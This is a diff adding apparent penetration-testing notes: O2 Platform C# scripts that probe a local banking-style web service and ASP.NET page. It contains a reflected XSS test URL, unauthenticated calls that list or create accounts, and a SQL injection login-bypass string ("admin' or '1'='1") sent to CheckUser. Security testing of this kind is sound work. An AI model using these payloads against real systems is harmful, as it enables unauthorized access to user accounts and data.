@@ -1,0 +1,113 @@
+
+XSS on anonymous page
+
+ie.open(@"http://localhost:2034/404.aspx?AttemptedUrl=Content\coantent1.dat%3Cscript%3Ealert('a')%3C/script%3E");
+
+
+********* webservices methods: http://localhost.:6879/SSBService.svc
+
+var sSBService = new SSBService();
+var response = sSBService.GetAllAccounts();
+return response; // response type is: System.Int64[]
+
+//O2File:C:\O2\_tempDir\11-3-2011\wsdl_tmp56E7\SSBService.cs
+//O2Ref:System.Web.Services.dll
+
+
+----------
+
+var sSBService = new SSBService();
+
+
+long userID = 3512145;
+var userIDSpecified = true;
+
+var response = sSBService.GetAccounts(userID ,userIDSpecified );
+return response; // response type is: System.Data.DataTable
+
+//O2File:C:\O2\_tempDir\11-3-2011\wsdl_tmpA873\SSBService.cs
+//O2Ref:System.Web.Services.dll
+
+----------
+
+
+var sSBService = new SSBService();
+
+
+var userID = 12;
+var userIDSpecified = true;
+var accountType = "a";
+var balance = "b";
+var accountLevel = "c";
+var status =1;
+var statusSpecified = true;
+
+sSBService.CreateAccount(userID ,userIDSpecified ,accountType ,balance ,accountLevel ,status ,statusSpecified );
+
+
+//O2File:C:\O2\_tempDir\11-3-2011\wsdl_tmpCDF9\SSBService.cs
+//O2Ref:System.Web.Services.dll
+
+
+----------
+
+
+var sSBService = new SSBService();
+
+
+long accountID = 3512145;
+var accountIDSpecified = true;
+long getBalanceResult = 0;
+var getBalanceResultSpecified = false;
+ 
+sSBService.GetBalance(accountID ,  accountIDSpecified , out  getBalanceResult , out getBalanceResultSpecified );
+return getBalanceResult;
+
+//O2File:C:\O2\_tempDir\11-3-2011\wsdl_tmp964A\SSBService.cs
+//O2Ref:System.Web.Services.dll
+
+
+
+//var topPanel = O2Gui.open<Panel>("{name}",700,400);
+var topPanel = panel.clear().add_Panel();
+var sSBService = new SSBService();
+
+
+long userID = 5;
+var userIDSpecified = true; 
+
+var response = sSBService.GetAccounts(userID ,userIDSpecified );
+
+var dataGridView = topPanel.add_DataGridView();
+dataGridView.DataSource = response;
+return response; // response type is: System.Data.DataTable
+
+//O2File:C:\O2\_tempDir\11-3-2011\wsdl_tmpA873\SSBService.cs
+//O2Ref:System.Web.Services.dll
+
+
+
+--------------------
+
+
+
+var sSBService = new SSBService();
+
+
+var username = "admin' or '1'='1";
+var password = "adasd'"; 
+long checkUserResult = 0;
+var checkUserResultSpecified = false; 
+try
+{ 
+	sSBService.CheckUser(username ,password , out checkUserResult  , out checkUserResultSpecified );
+}
+catch(Exception ex)
+{
+	ex.log();
+}
+
+return checkUserResult;
+
+//O2File:C:\O2\_tempDir\11-3-2011\wsdl_tmp99D8\SSBService.cs 
+//O2Ref:System.Web.Services.dll
